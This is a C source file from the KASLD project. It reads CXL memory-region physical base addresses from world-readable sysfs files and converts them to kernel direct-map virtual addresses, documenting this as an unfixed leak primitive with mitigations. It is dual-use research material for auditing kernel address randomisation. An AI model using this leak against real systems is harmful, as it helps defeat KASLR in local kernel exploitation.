// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Read Host Physical Addresses (HPA) of CXL (Compute Express Link) memory
// regions from sysfs.
//
// The CXL subsystem exposes active memory regions at:
//
//   /sys/bus/cxl/devices/regionN/resource  (HPA base, %#llx format)
//
// The 'resource' attribute is created with DEVICE_ATTR_RO (S_IRUGO, 0444)
// in drivers/cxl/core/region.c and reports p->res->start — the Host
// Physical Address of the region's resource allocation. No capability
// check; world-readable.
//
// When a region has no active allocation, the kernel returns -1ULL
// (0xffffffffffffffff); only regions with a valid physical base address
// are reported.
//
// CXL memory regions are physical DRAM ranges. On architectures with a
// fixed physical-to-virtual mapping, these addresses convert directly to
// linear-map kernel virtual addresses.
//
// Leak primitive:
//   Data leaked:      CXL region Host Physical Address (DRAM base)
//   Kernel subsystem: drivers/cxl — /sys/bus/cxl/devices/regionN/resource
//   Data structure:   struct cxl_region_params → res->start (resource_size_t)
//   Address type:     physical (DRAM)
//   Method:           parsed (sysfs text attribute)
//   Status:           unfixed (information exposure by design)
//   Access check:     none (world-readable via DEVICE_ATTR_RO / S_IRUGO)
//   Source:
//   https://elixir.bootlin.com/linux/latest/source/drivers/cxl/core/region.c
//
// Mitigations:
//   CONFIG_CXL_BUS=n removes the subsystem entirely. On x86_64 with
//   CONFIG_RANDOMIZE_MEMORY enabled, physical addresses do not directly
//   reveal the virtual text base.
//
// Requires:
// - CONFIG_CXL_BUS
// - At least one active CXL memory region with an allocated resource
//
// References:
// https://elixir.bootlin.com/linux/latest/source/drivers/cxl/core/region.c
// https://www.kernel.org/doc/html/latest/driver-api/cxl/memory-devices.html
// ---
// <bcoles@gmail.com>

#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <dirent.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

KASLD_EXPLAIN(
    "Reads Host Physical Addresses (HPA) of CXL (Compute Express Link) "
    "memory regions from /sys/bus/cxl/devices/regionN/resource. The CXL "
    "subsystem exposes each active region's physical base address with "
    "world-readable (0444) DEVICE_ATTR_RO attributes — no capability "
    "check, not gated by kptr_restrict. On architectures with a fixed "
    "physical-to-virtual mapping, these DRAM base addresses yield linear-"
    "map kernel virtual addresses. Requires CONFIG_CXL_BUS.");

// Untested: no CXL hardware available for testing.
KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:physical\n"
           "status:experimental\n"
           "config:CONFIG_CXL_BUS\n");

static int read_file_line(const char *path, char *buf, size_t len) {
  FILE *f = fopen(path, "r");
  if (!f)
    return -1;
  if (fgets(buf, (int)len, f) == NULL) {
    fclose(f);
    return -1;
  }
  fclose(f);
  buf[strcspn(buf, "\n")] = '\0';
  return 0;
}

int main(void) {
  const char *base = "/sys/bus/cxl/devices";
  DIR *d;
  struct dirent *ent;
  char path[512];
  char buf[256];
  char label[128];
  int device_count = 0;
  int count = 0;

  fprintf(stderr, "[.] searching %s for CXL region HPA addresses ...\n", base);

  d = opendir(base);
  if (!d) {
    if (errno == EACCES || errno == EPERM)
      return KASLD_EXIT_NOPERM;
    /* /sys/bus/cxl/devices absent if CONFIG_CXL_BUS is not enabled */
    return KASLD_EXIT_UNAVAILABLE;
  }

  while ((ent = readdir(d)) != NULL) {
    /* Region devices are named regionN (e.g. region0, region1) */
    if (strncmp(ent->d_name, "region", 6) != 0)
      continue;

    device_count++;

    snprintf(path, sizeof(path), "%s/%s/resource", base, ent->d_name);

    if (read_file_line(path, buf, sizeof(buf)) < 0)
      continue;

    unsigned long long addr = 0;
    /* resource attribute uses %#llx format: "0x<hex>" */
    if (sscanf(buf, "0x%llx", &addr) != 1)
      continue;

    /* -1ULL indicates no active allocation */
    if (addr == ~0ULL || !addr)
      continue;

    /* CXL regions are persistent / volatile memory exposed by CXL devices.
     * The region directory name (e.g. "region0") identifies which one. */
    snprintf(label, sizeof(label), "%.32s", ent->d_name);

    fprintf(stderr, "[+] sysfs_cxl_region %s: phys = 0x%016llx\n", label, addr);
    kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, (unsigned long)addr,
                 KASLD_REGION_PMEM, label);
    count++;

#if !PHYS_VIRT_DECOUPLED
    unsigned long virt = phys_to_virt((unsigned long)addr);
    fprintf(stderr, "[+] sysfs_cxl_region %s: directmap va = 0x%016lx\n", label,
            virt);
    kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, virt,
                 KASLD_REGION_PMEM, label);
#endif
  }
  closedir(d);

  if (!count) {
    if (!device_count)
      fprintf(stderr, "[-] no CXL region devices found in %s\n", base);
    else
      fprintf(stderr,
              "[-] %d CXL region(s) found but no allocated "
              "resource addresses\n",
              device_count);
    return KASLD_EXIT_UNAVAILABLE;
  }

  return 0;
}
